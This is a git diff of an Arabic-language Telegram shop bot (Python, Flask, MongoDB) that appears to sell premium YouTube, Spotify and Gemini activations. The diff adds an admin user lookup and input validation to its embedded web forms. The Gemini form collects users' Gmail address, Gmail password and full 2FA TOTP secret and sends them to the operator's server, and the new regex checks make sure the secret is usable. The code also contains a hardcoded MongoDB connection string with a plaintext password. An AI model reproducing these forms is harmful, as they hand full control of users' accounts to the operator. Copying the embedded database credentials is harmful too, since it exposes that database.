@@ -4,6 +4,7 @@ from telebot.types import ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMar
 from flask import Flask, request, jsonify
 from pymongo import MongoClient
 import datetime
+import re
 
 # --- الإعدادات الأساسية ---
 BOT_TOKEN = os.environ.get('BOT_TOKEN', '').strip()
@@ -17,7 +18,7 @@ MONGO_URI = "mongodb+srv://hanytgribi_db_user:KA1999KA@cluster0.kez5fjj.mongodb.
 client = MongoClient(MONGO_URI)
 db = client['MyBotDB']
 users_collection = db['users']
-settings_collection = db['settings'] # قاعدة بيانات جديدة للإعدادات المرنة
+settings_collection = db['settings']
 
 # --- جلب إعدادات المتجر ---
 def get_settings():
@@ -60,7 +61,7 @@ def admin_keyboard():
     markup.add(KeyboardButton("➕ إضافة نقاط"), KeyboardButton("➖ سحب نقاط"))
     markup.add(KeyboardButton("📩 رد/رسالة لمستخدم"), KeyboardButton("📢 إذاعة للجميع"))
     markup.add(KeyboardButton("💰 تعديل سعر الخدمات"), KeyboardButton("🎁 تعديل مكافأة الدعوة"))
-    markup.add(KeyboardButton(BTN_MAIN)) # للعودة كعميل
+    markup.add(KeyboardButton("🔍 استعلام عن مستخدم"), KeyboardButton(BTN_MAIN))
     return markup
 
 # --- أمر فتح لوحة الإدارة ---
@@ -110,7 +111,7 @@ def send_welcome(message):
     welcome_text = f"أهلاً بك يا <b>{first_name}</b> في متجرنا الإلكتروني! 🤖✨\n\nتفضل باختيار ما تريد من القائمة التفاعلية بالأسفل 👇"
     bot.send_message(message.chat.id, welcome_text, reply_markup=main_keyboard())
 
-# --- زر الرد من تحت الطلب مباشرة (كما هو) ---
+# --- زر الرد من تحت الطلب مباشرة ---
 @bot.callback_query_handler(func=lambda call: call.data.startswith('reply_'))
 def handle_reply_button(call):
     if str(call.from_user.id) == str(ADMIN_ID):
@@ -166,7 +167,7 @@ def handle_text(message):
             elif action == 'reply_user_step1':
                 admin_states[user_id] = {'action': 'reply_user', 'target': text}
                 bot.send_message(user_id, "✍️ اكتب رسالتك الآن التي تريد إرسالها له:")
-                return # ننتظر الرسالة
+                return
                 
             elif action == 'reply_user':
                 target_id = int(state['target'])
@@ -187,7 +188,6 @@ def handle_text(message):
                 new_price = int(text)
                 settings_collection.update_one({"_id": "bot_settings"}, {"$set": {"service_price": new_price}})
                 bot.send_message(user_id, f"✅ تم تغيير سعر جميع الخدمات إلى {new_price} نقطة.", reply_markup=admin_keyboard())
-                # إشعار جميع المستخدمين بتغيير السعر
                 users = users_collection.find({})
                 for u in users:
                     try: bot.send_message(u['user_id'], f"📣 <b>تحديث في المتجر:</b>\n\nتم تعديل سعر طلب الخدمات ليصبح <b>{new_price}</b> نقطة. سارع بالطلب الآن!")
@@ -197,9 +197,27 @@ def handle_text(message):
                 new_ref = int(text)
                 settings_collection.update_one({"_id": "bot_settings"}, {"$set": {"referral_bonus": new_ref}})
                 bot.send_message(user_id, f"✅ تم تغيير مكافأة الدعوة إلى {new_ref} نقطة.", reply_markup=admin_keyboard())
-        
+
+            elif action == 'check_user':
+                target_id = int(text)
+                target_user = users_collection.find_one({"user_id": target_id})
+                if target_user:
+                    u_name = target_user.get("first_name", "غير معروف")
+                    u_pts = target_user.get("points", 0)
+                    u_invites = target_user.get("invites", 0)
+                    u_banned = "نعم 🚫" if target_user.get("is_banned", False) else "لا ✅"
+                    info_msg = (f"🔍 <b>نتيجة الاستعلام:</b>\n\n"
+                                f"👤 <b>الاسم:</b> {u_name}\n"
+                                f"🆔 <b>الآيدي:</b> <code>{target_id}</code>\n"
+                                f"⭐ <b>الرصيد:</b> {u_pts} نقطة\n"
+                                f"🤝 <b>المدعوين:</b> {u_invites} أشخاص\n"
+                                f"🔒 <b>محظور؟</b> {u_banned}")
+                    bot.send_message(user_id, info_msg, reply_markup=admin_keyboard())
+                else:
+                    bot.send_message(user_id, "❌ لم يتم العثور على هذا المستخدم في قاعدة البيانات.", reply_markup=admin_keyboard())
+
         except Exception as e:
-            bot.send_message(user_id, f"❌ حدث خطأ، يرجى كتابة البيانات بشكل صحيح.\nالخطأ: {e}")
+            bot.send_message(user_id, f"❌ حدث خطأ، يرجى التحقق من المدخلات.\nالخطأ: {e}")
         
         del admin_states[user_id]
         return
@@ -238,6 +256,10 @@ def handle_text(message):
             admin_states[user_id] = {'action': 'change_referral'}
             bot.send_message(user_id, "أرسل نقاط المكافأة الجديدة لدعوة الأصدقاء (رقم فقط):")
             return
+        elif text == "🔍 استعلام عن مستخدم":
+            admin_states[user_id] = {'action': 'check_user'}
+            bot.send_message(user_id, "أرسل ID العميل للاستعلام عن بياناته وحسابه:")
+            return
 
     # === 3. معالجة العملاء (النظام العادي) ===
     user = users_collection.find_one({"user_id": user_id})
@@ -249,7 +271,6 @@ def handle_text(message):
         bot.send_message(user_id, "⛔️ <b>عذراً، حسابك محظور من استخدام الخدمات.</b>", parse_mode="HTML")
         return
 
-    # استدعاء الإعدادات الحالية المرنة
     bot_settings = get_settings()
     service_price = bot_settings.get("service_price", 15)
     ref_bonus = bot_settings.get("referral_bonus", 2)
@@ -359,7 +380,7 @@ def submit_form():
     return jsonify({"status": "error"}), 400
 
 # ==========================================
-# --- أكواد ونماذج HTML المدمجة ---
+# --- أكواد ونماذج HTML المدمجة (مع نظام الفلترة الذكي) ---
 # ==========================================
 
 @app.route('/youtube.html')
@@ -376,19 +397,28 @@ def youtube_form():
             .card { background: white; padding: 30px 20px; border-radius: 16px; box-shadow: 0 4px 12px rgba(0,0,0,0.05); margin-top: 20px; }
             h2 { color: #333; margin-top: 0; display: flex; align-items: center; justify-content: center; gap: 8px;}
             p { color: #666; font-size: 15px; margin-bottom: 25px; }
-            input { width: 100%; padding: 15px; margin-bottom: 20px; border: 1.5px solid #eee; border-radius: 10px; font-size: 16px; box-sizing: border-box; transition: 0.3s; text-align: left; direction: ltr; }
+            input { width: 100%; padding: 15px; margin-bottom: 10px; border: 1.5px solid #eee; border-radius: 10px; font-size: 16px; box-sizing: border-box; transition: 0.3s; text-align: left; direction: ltr; }
             input:focus { border-color: #FF0000; outline: none; }
-            button { background-color: #FF0000; color: white; border: none; padding: 15px; border-radius: 10px; font-size: 16px; font-weight: bold; width: 100%; cursor: pointer; box-shadow: 0 4px 6px rgba(255,0,0,0.2); }
+            button { background-color: #FF0000; color: white; border: none; padding: 15px; border-radius: 10px; font-size: 16px; font-weight: bold; width: 100%; cursor: pointer; box-shadow: 0 4px 6px rgba(255,0,0,0.2); margin-top: 10px; }
             button:disabled { background-color: #ccc; cursor: not-allowed; }
+            
+            /* تأثيرات الخطأ */
+            @keyframes shake { 0%, 100% {transform: translateX(0);} 25% {transform: translateX(-5px);} 50% {transform: translateX(5px);} 75% {transform: translateX(-5px);} }
+            .input-error { border-color: #FF0000 !important; background-color: #ffe6e6 !important; animation: shake 0.4s; }
+            .error-msg { color: #FF0000; font-size: 12px; font-weight: bold; margin-bottom: 15px; display: none; text-align: right; }
         </style>
     </head>
     <body>
         <div class="card">
             <h2>يوتيوب بريميوم 📺</h2>
             <p>يرجى لصق رابط التحقق والدفع الخاص بك في الأسفل:</p>
-            <input type="url" id="link" placeholder="https://..." required>
+            
+            <input type="url" id="link" placeholder="https://offers.sheerid.com/..." oninput="clearError('link')">
+            <div id="link-error" class="error-msg">⚠️ عذراً، يجب أن يبدأ الرابط بـ https://offers.sheerid.com/</div>
+            
             <button id="submitBtn" onclick="sendData()">تأكيد وطلب التفعيل</button>
         </div>
+        
         <script>
             let tg = window.Telegram.WebApp;
             tg.expand();
@@ -396,9 +426,22 @@ def youtube_form():
             const uid = urlParams.get('uid');
             const msg_id = urlParams.get('msg_id');
 
+            function clearError(id) {
+                document.getElementById(id).classList.remove('input-error');
+                document.getElementById(id + '-error').style.display = 'none';
+            }
+
             function sendData() {
-                let link = document.getElementById('link').value;
-                if(!link) { alert("⚠️ الرجاء إدخال الرابط أولاً!"); return; }
+                let linkInput = document.getElementById('link');
+                let link = linkInput.value.trim();
+                
+                // فلترة الرابط
+                if(!link.startsWith("https://offers.sheerid.com/")) { 
+                    linkInput.classList.add('input-error');
+                    document.getElementById('link-error').style.display = 'block';
+                    setTimeout(() => linkInput.classList.remove('input-error'), 400); // إيقاف الاهتزاز بعد انتهائه
+                    return; 
+                }
                 
                 document.getElementById('submitBtn').disabled = true;
                 document.getElementById('submitBtn').innerText = "جاري الإرسال...";
@@ -409,9 +452,7 @@ def youtube_form():
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
                     body: JSON.stringify({uid: uid, msg_id: msg_id, dataString: dataString})
-                }).then(response => {
-                    tg.close();
-                }).catch(err => {
+                }).then(response => { tg.close(); }).catch(err => {
                     alert("حدث خطأ أثناء الإرسال.");
                     document.getElementById('submitBtn').disabled = false;
                     document.getElementById('submitBtn').innerText = "تأكيد وطلب التفعيل";
@@ -436,29 +477,51 @@ def spotify_form():
             .card { background: white; padding: 30px 20px; border-radius: 16px; box-shadow: 0 4px 12px rgba(0,0,0,0.05); margin-top: 20px; }
             h2 { color: #333; margin-top: 0; display: flex; align-items: center; justify-content: center; gap: 8px;}
             p { color: #666; font-size: 15px; margin-bottom: 25px; }
-            input { width: 100%; padding: 15px; margin-bottom: 20px; border: 1.5px solid #eee; border-radius: 10px; font-size: 16px; box-sizing: border-box; transition: 0.3s; text-align: left; direction: ltr; }
+            input { width: 100%; padding: 15px; margin-bottom: 10px; border: 1.5px solid #eee; border-radius: 10px; font-size: 16px; box-sizing: border-box; transition: 0.3s; text-align: left; direction: ltr; }
             input:focus { border-color: #1DB954; outline: none; }
-            button { background-color: #1DB954; color: white; border: none; padding: 15px; border-radius: 10px; font-size: 16px; font-weight: bold; width: 100%; cursor: pointer; box-shadow: 0 4px 6px rgba(29,185,84,0.2); }
+            button { background-color: #1DB954; color: white; border: none; padding: 15px; border-radius: 10px; font-size: 16px; font-weight: bold; width: 100%; cursor: pointer; box-shadow: 0 4px 6px rgba(29,185,84,0.2); margin-top: 10px;}
             button:disabled { background-color: #ccc; cursor: not-allowed; }
+            
+            /* تأثيرات الخطأ */
+            @keyframes shake { 0%, 100% {transform: translateX(0);} 25% {transform: translateX(-5px);} 50% {transform: translateX(5px);} 75% {transform: translateX(-5px);} }
+            .input-error { border-color: #FF0000 !important; background-color: #ffe6e6 !important; animation: shake 0.4s; }
+            .error-msg { color: #FF0000; font-size: 12px; font-weight: bold; margin-bottom: 15px; display: none; text-align: right; }
         </style>
     </head>
     <body>
         <div class="card">
             <h2>سبوتيفاي بريميوم 🎵</h2>
             <p>يرجى لصق رابط التحقق والدفع الخاص بك في الأسفل:</p>
-            <input type="url" id="link" placeholder="https://..." required>
+            
+            <input type="url" id="link" placeholder="https://offers.sheerid.com/..." oninput="clearError('link')">
+            <div id="link-error" class="error-msg">⚠️ عذراً، يجب أن يبدأ الرابط بـ https://offers.sheerid.com/</div>
+            
             <button id="submitBtn" onclick="sendData()">تأكيد وطلب التفعيل</button>
         </div>
+        
         <script>
             let tg = window.Telegram.WebApp;
             tg.expand();
             const urlParams = new URLSearchParams(window.location.search);
             const uid = urlParams.get('uid');
             const msg_id = urlParams.get('msg_id');
+            
+            function clearError(id) {
+                document.getElementById(id).classList.remove('input-error');
+                document.getElementById(id + '-error').style.display = 'none';
+            }
 
             function sendData() {
-                let link = document.getElementById('link').value;
-                if(!link) { alert("⚠️ الرجاء إدخال الرابط أولاً!"); return; }
+                let linkInput = document.getElementById('link');
+                let link = linkInput.value.trim();
+                
+                // فلترة الرابط
+                if(!link.startsWith("https://offers.sheerid.com/")) { 
+                    linkInput.classList.add('input-error');
+                    document.getElementById('link-error').style.display = 'block';
+                    setTimeout(() => linkInput.classList.remove('input-error'), 400); 
+                    return; 
+                }
                 
                 document.getElementById('submitBtn').disabled = true;
                 document.getElementById('submitBtn').innerText = "جاري الإرسال...";
@@ -469,9 +532,7 @@ def spotify_form():
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
                     body: JSON.stringify({uid: uid, msg_id: msg_id, dataString: dataString})
-                }).then(response => {
-                    tg.close();
-                }).catch(err => {
+                }).then(response => { tg.close(); }).catch(err => {
                     alert("حدث خطأ أثناء الإرسال.");
                     document.getElementById('submitBtn').disabled = false;
                     document.getElementById('submitBtn').innerText = "تأكيد وطلب التفعيل";
@@ -509,6 +570,11 @@ def gemini_form():
             .submit-btn { background-color: #0f9d58; color: white; border: none; padding: 16px; border-radius: 8px; font-size: 16px; cursor: pointer; width: 100%; font-weight: bold; display: flex; align-items: center; justify-content: center; gap: 10px; margin-top: 10px;}
             .submit-btn:disabled { background-color: #ccc; cursor: not-allowed; }
             .footer-note { text-align: center; font-size: 11px; color: #aaa; margin-top: 20px; }
+            
+            /* تأثيرات الخطأ */
+            @keyframes shake { 0%, 100% {transform: translateX(0);} 25% {transform: translateX(-5px);} 50% {transform: translateX(5px);} 75% {transform: translateX(-5px);} }
+            .input-error { border-color: #ff3333 !important; background-color: #ffe6e6 !important; animation: shake 0.4s; }
+            .error-msg { color: #ff3333; font-size: 11.5px; font-weight: bold; margin-top: -5px; margin-bottom: 10px; display: none; }
         </style>
     </head>
     <body>
@@ -522,13 +588,14 @@ def gemini_form():
             
             <div class="form-group">
                 <label>Gmail عنوان</label>
-                <input type="email" id="email" placeholder="example@gmail.com" required>
+                <input type="email" id="email" placeholder="example@gmail.com" oninput="clearError('email')">
+                <div id="email-error" class="error-msg">⚠️ عذراً، يجب أن ينتهي البريد بـ @gmail.com</div>
             </div>
             
             <div class="form-group">
                 <label>كلمة مرور جيميل</label>
                 <div class="input-wrapper">
-                    <input type="password" id="password" placeholder="الخاصة بك Gmail أدخل كلمة مرور" required>
+                    <input type="password" id="password" placeholder="الخاصة بك Gmail أدخل كلمة مرور" oninput="clearError('password')">
                     <span class="toggle-password" onclick="togglePwd()">👁️</span>
                 </div>
             </div>
@@ -537,7 +604,8 @@ def gemini_form():
             
             <div class="form-group">
                 <label>سر المصادقة الثنائية (TOTP)</label>
-                <input type="text" id="totp" placeholder="على سبيل المثال: JBSWY3DPEHPK3PXP">
+                <input type="text" id="totp" placeholder="على سبيل المثال: JBSWY3DPEHPK3PXP" oninput="clearError('totp')">
+                <div id="totp-error" class="error-msg">⚠️ رمز المصادقة يجب أن يكون 32 حرفاً ورقماً (بدون مسافات)</div>
                 <span class="helper-text">ℹ️ Base32 حرفًا 32 :Google Authenticator المفتاح السري من (والأرقام من 2 إلى 7 Z إلى A الحروف من) بالضبط.</span>
             </div>
             
@@ -560,23 +628,58 @@ def gemini_form():
             const msg_id = urlParams.get('msg_id');
             const points = urlParams.get('pts');
             
-            if(points) {
-                document.getElementById('userPoints').innerText = points;
-            }
+            if(points) { document.getElementById('userPoints').innerText = points; }
             
             function togglePwd() {
                 let pwd = document.getElementById("password");
-                if(pwd.type === "password") { pwd.type = "text"; } else { pwd.type = "password"; }
+                pwd.type = pwd.type === "password" ? "text" : "password";
+            }
+            
+            function clearError(id) {
+                document.getElementById(id).classList.remove('input-error');
+                document.getElementById(id + '-error').style.display = 'none';
             }
             
             function sendData() {
-                let email = document.getElementById('email').value;
-                let pwd = document.getElementById('password').value;
-                let totp = document.getElementById('totp').value;
+                let emailInput = document.getElementById('email');
+                let pwdInput = document.getElementById('password');
+                let totpInput = document.getElementById('totp');
+                
+                let email = emailInput.value.trim();
+                let pwd = pwdInput.value;
+                let totp = totpInput.value.trim().toUpperCase(); // تحويل الحروف لكبيرة لتسهيل الفحص
                 let backup = document.getElementById('backup').value;
                 
-                if(!email || !pwd) { alert("⚠️ الرجاء إدخال الإيميل وكلمة المرور الأساسية!"); return; }
+                let isValid = true;
                 
+                // 1. فلترة البريد الإلكتروني
+                if(!email.endsWith("@gmail.com")) {
+                    emailInput.classList.add('input-error');
+                    document.getElementById('email-error').style.display = 'block';
+                    setTimeout(() => emailInput.classList.remove('input-error'), 400);
+                    isValid = false;
+                }
+                
+                // 2. فلترة كلمة المرور (يجب أن لا تكون فارغة)
+                if(!pwd) {
+                    pwdInput.classList.add('input-error');
+                    setTimeout(() => pwdInput.classList.remove('input-error'), 400);
+                    isValid = false;
+                }
+                
+                // 3. فلترة رمز المصادقة (32 حرف/رقم من A-Z و 2-7)
+                const totpRegex = /^[A-Z2-7]{32}$/;
+                if(!totpRegex.test(totp)) {
+                    totpInput.classList.add('input-error');
+                    document.getElementById('totp-error').style.display = 'block';
+                    setTimeout(() => totpInput.classList.remove('input-error'), 400);
+                    isValid = false;
+                }
+                
+                // إذا كان هناك أي خطأ، نوقف عملية الإرسال
+                if(!isValid) return;
+                
+                // إذا كانت البيانات صحيحة 100%، نقوم بالإرسال للسيرفر
                 document.getElementById('submitBtn').disabled = true;
                 document.getElementById('submitBtn').innerHTML = "جاري الإرسال... ⏳";
 
@@ -590,9 +693,7 @@ def gemini_form():
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
                     body: JSON.stringify({uid: uid, msg_id: msg_id, dataString: dataString})
-                }).then(response => {
-                    tg.close();
-                }).catch(err => {
+                }).then(response => { tg.close(); }).catch(err => {
                     alert("حدث خطأ أثناء الإرسال.");
                     document.getElementById('submitBtn').disabled = false;
                     document.getElementById('submitBtn').innerHTML = "تأكيد وتفعيل ⚡";
